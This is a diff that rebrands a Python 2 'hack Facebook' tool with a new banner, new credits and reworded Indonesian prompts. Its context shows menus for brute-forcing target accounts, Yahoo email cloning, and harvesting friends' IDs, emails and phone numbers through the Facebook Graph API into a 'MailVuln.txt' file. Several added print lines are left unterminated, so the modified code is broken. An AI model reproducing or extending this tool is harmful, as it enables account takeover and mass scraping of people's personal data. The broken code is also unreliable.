@@ -33,7 +33,37 @@ def jalan(z):
         sys.stdout.flush()
         time.sleep(0.01)
 
-logo = " \x1b[1;92m█████████\n \x1b[1;92m█▄█████▄█         \x1b[1;97m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\n \x1b[1;92m█ \x1b[1;93m▼▼▼▼▼  \x1b[1;97m- _ --_-- \x1b[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[1;92m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;92m█ \x1b[1;93m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[1;93mPremium\n \x1b[1;92m█████████         \x1b[1;97m«==========✧==========»\n \x1b[1;92m ██ ██\n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mReCode   \x1b[1;91m:  \x1b[1;96m The Magizz  \x1b[1;97m                   ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mGitHub   \x1b[1;91m:  \x1b[1;92m \x1b[92mhttps://github.com/TheMagizz\x1b[    \x1b[1;97m ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mFB       \x1b[1;91m:   \x1b[1;92\x1b[92mhttps://fb.me/rizz.magizz\x1b[     \x1b[1;97m   ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  '\n\x1b[1;92m[*] Silahkan Login Operamini Agar Tidak Checkpoint\n'
+def banner():
+    os.system('clear')
+    print " "
+    runntxt(GL+"             HORAS HITA SUDE!!!. ^_^")
+    runntxt(WW+'   __________                __ ')         
+    runntxt(GL+'   \______   \_______ __ ___/  |_  ____  ')
+    runntxt(GG+'    |    |  _/\_  __ \  |  \   __\/ __ \ ')
+    runntxt(WW+'    |    |   \ |  | \/  |  /|  | \  ___/ ')
+    runntxt(GG+'    |______  / |__|  |____/ |__|  \___  > ')
+    runntxt(Y+'           \/                         \/ ')
+			   
+	    
+    time.sleep(1.5)
+    print GG+"  √=============================================√"
+    print GL+"  |••••••   NEW TOOLS HACK FACEBOOK BF.   ••••••|"
+    print GG+"  √=============================================√"
+    print WW+"  |            MOD BY: NICOLEUS AJAH!!             |"
+    print GL+"  |       Ngocok Dulu Sebelum Menggunakan       |"
+    print WW+"  |            FACEBOOK: nicoleus            |"
+    print Y+"  |             YOUTUBE: Ady sitorus ady|"
+    print GL+"  |---------------------------------------------|"
+    print GL+"  |        LIFE OF PROGRAMMER [ L.O.P ]         |"
+    print GL+"  |---------------------------------------------|"
+    print GG+"  √=============================================√"
+    print GL+"  |•••••••••   HACK FACEBOOK MAS ^_^   •••••••••|"
+    print GG+"  √=============================================√"
+
+banner()
+
+
+logo = " \x1b[1;92m█████████\n \x1b[1;92m█▄█████▄█         \x1b[1;97m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\n \x1b[1;92m█ \x1b[1;93m▼▼▼▼▼  \x1b[1;97m- _ --_-- \x1b[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[1;92m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;92m█ \x1b[1;93m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[1;93mPremium\n \x1b[1;92m█████████         \x1b[1;97m«==========✧==========»\n \x1b[1;92m ██ ██\n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mReCode   \x1b[1;91m:  \x1b[1;96m The Horas  \x1b[1;97m                   ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mGitHub   \x1b[1;91m:  \x1b[1;92m \x1b[92mhttps://github.com/TheHoras\x1b[    \x1b[1;97m ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mFB       \x1b[1;91m:   \x1b[1;92\x1b[92mhttps://fb.me/rizz.Horas\x1b[     \x1b[1;97m   ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  '\n\x1b[1;92m[*] Silahkan Login Operamini Bang Agar Tidak Checkpoint\n'
 
 def tik():
     titik = [
@@ -75,14 +105,14 @@ def login():
         os.system('clear')
         print logo
         print 52 * '\x1b[1;97m\xe2\x95\x90'
-        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mMASUK AKUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
+        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mHoras MASUK AKUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
         id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername \x1b[1;91m:\x1b[1;92m ')
         pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
         tik()
         try:
             br.open('https://m.facebook.com')
         except mechanize.URLError:
-            print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
+            print '\n\x1b[1;91m[!] Tidak Ada Koneksi Bangeee'
             keluar()
 
         br._factory.is_html = True
@@ -145,7 +175,7 @@ def menu():
             sub = str(b['summary']['total_count'])
         except KeyError:
             os.system('clear')
-            print '\x1b[1;91m[!] \x1b[1;93mSepertinya akun kena Checkpoint'
+            print '\x1b[1;91m[!] \x1b[1;93mSepertinya akun Abang kena Checkpoint'
             os.system('rm -rf login.txt')
             time.sleep(0.01)
             login()
@@ -200,7 +230,7 @@ def pilih():
                         else:
                             if zedd == '6':
                                 os.system('rm -rf login.txt')
-				os.system('xdg-open https://m.facebook.com/rizz.magizz')
+				os.system('xdg-open https://m.facebook.com/rizz.Horas')
                                 keluar()
                             else:
                                 if zedd == '0':
@@ -276,7 +306,7 @@ def informasi():
             raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
             menu()
     else:
-        print '\x1b[1;91m[\xe2\x9c\x96] Pengguna Tidak Ada'
+        print '\x1b[1;91m[\xe2\x9c\x96] Pengguna Tidak Ada Bangee'
         raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
         menu()
 
@@ -300,7 +330,8 @@ def menu_hack():
     print '║-> \x1b[1;37;40m4. BruteForce (\x1b[1;92mTarget\x1b[1;97m)'
     print '║-> \x1b[1;37;40m5. Yahoo Clone'
     print '║-> \x1b[1;37;40m6. Ambil ID/Email/HP'
-    print '║-> \x1b[1;31;40m0. Back'
+    print '║-> \x1b[1;31;40m7. Auto Recall Hp
+    print '║-> \x1b[1;31;40m0. 
     print '\x1b[1;37;40m║'
     hack_pilih()
 
@@ -785,9 +816,9 @@ def brute():
 
 
 def tanyaw():
-    why = raw_input('\x1b[1;91m[?] \x1b[1;92mKamu ingin membuat  wordlist ? \x1b[1;92m[y/t]\x1b[1;91m:\x1b[1;97m ')
+    why = raw_input('\x1b[1;91m[?] \x1b[1;92mKamu ingin membuat  wordlist lae!! ? \x1b[1;92m[y/t]\x1b[1;91m:\x1b[1;97m ')
     if why == '':
-        print '\x1b[1;91m[!] Mohon Pilih \x1b[1;97m(y/t)'
+        print '\x1b[1;91m[!] Mohon Pilih Lae!! \x1b[1;97m(y/t)'
         tanyaw()
     else:
         if why == 'y':
@@ -802,7 +833,7 @@ def tanyaw():
                     if why == 'T':
                         menu_hack()
                     else:
-                        print '\x1b[1;91m[!] Mohon Pilih \x1b[1;97m(y/t)'
+                        print '\x1b[1;91m[!] Mohon Pilih lae!! \x1b[1;97m(y/t)'
                         tanyaw()
 
 
@@ -821,6 +852,7 @@ def menu_yahoo():
     print 52 * '\x1b[1;97m\xe2\x95\x90'
     print '║-> \x1b[1;37;40m1. From Friends'
     print '║-> \x1b[1;37;40m2. From File'
+    print '║-> \x1b[1;37;40m3. From Yt
     print '║-> \x1b[1;31;40m0. Back'
     print '\x1b[1;37;40m║'
     yahoo_pilih()
@@ -860,7 +892,7 @@ def yahoofriends():
     print 52 * '\x1b[1;97m\xe2\x95\x90'
     mpsh = []
     jml = 0
-    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu \x1b[1;97m...')
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu Ya Bangee \x1b[1;97m...')
     friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
     kimak = json.loads(friends.text)
     save = open('MailVuln.txt', 'w')
@@ -990,6 +1022,7 @@ def grab():
     print '║-> \x1b[1;37;40m5. Get Friends Email From Friends'
     print '║-> \x1b[1;37;40m6. Get Phone From Friends'
     print '║-> \x1b[1;37;40m7. Get Friend\'s Phone From Friends'
+    print '║-> \x1b[1;37;40m8. Get Auto Hack YOUTUBE ID
     print '║-> \x1b[1;31;40m0. Back'
     print '\x1b[1;37;40m║'
     grab_pilih()
@@ -1446,6 +1479,7 @@ def menu_bot():
     print '║-> \x1b[1;37;40m5. Mass Delete Post'
     print '║-> \x1b[1;37;40m6. Accept Friend Requests'
     print '║-> \x1b[1;37;40m7. Unfriends'
+    print '║-> \x1b[1;37;40m8. Auto Ngocok
     print '║-> \x1b[1;31;40m0. Back'
     print '\x1b[1;37;40m║'
     bot_pilih()
